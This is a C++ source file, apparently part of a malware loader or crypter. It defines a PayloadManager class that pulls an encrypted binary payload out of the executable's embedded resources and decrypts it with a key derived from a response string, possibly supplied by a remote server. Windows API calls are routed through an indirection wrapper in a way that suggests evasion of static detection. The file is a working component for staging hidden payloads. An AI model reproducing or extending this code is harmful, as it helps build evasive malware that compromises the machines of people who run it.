#include "pch.h"

#include "resource.h"
#include "PayloadManager.hpp"
#include "Cryptography.hpp"

PayloadManager::PayloadManager() {
    this->encryptedData = this->LoadRawData();
}

vector<BYTE>* PayloadManager::LoadRawData() {
    RunImp* dImp = RunImp::GetInstance();

    HMODULE m_hInstance = dImp->dGetModuleHandleA(NULL);
    HRSRC hResource = FindResource(m_hInstance, MAKEINTRESOURCE(IDR_P_BIN1), "P_BIN");

    if (!hResource) {
        return nullptr;
    }

    HGLOBAL hLoadedResource = dImp->dLoadResource(m_hInstance, hResource);

    if (!hLoadedResource) {
        return nullptr;
    }

    LPVOID pLockedResource = dImp->dLockResource(hLoadedResource);

    if (!pLockedResource) {
        return nullptr;
    }

    DWORD dwResourceSize = dImp->dSizeofResource(m_hInstance, hResource);

    if (!dwResourceSize) {
        return nullptr;
    }

    vector<BYTE>* data = new vector<BYTE>(plusaes::get_padded_encrypted_size(dwResourceSize));
    memcpy(&data->data()[0], pLockedResource, dwResourceSize);

    return data;
}

vector<BYTE>* PayloadManager::GetDecryptedPayload(string response) {
    DecryptKey key = Cryptography::GetKeyFromResponse(response);
    Cryptography c(key);

    vector<BYTE>* decrypted = c.Decrypt(this->encryptedData);

    return decrypted;
}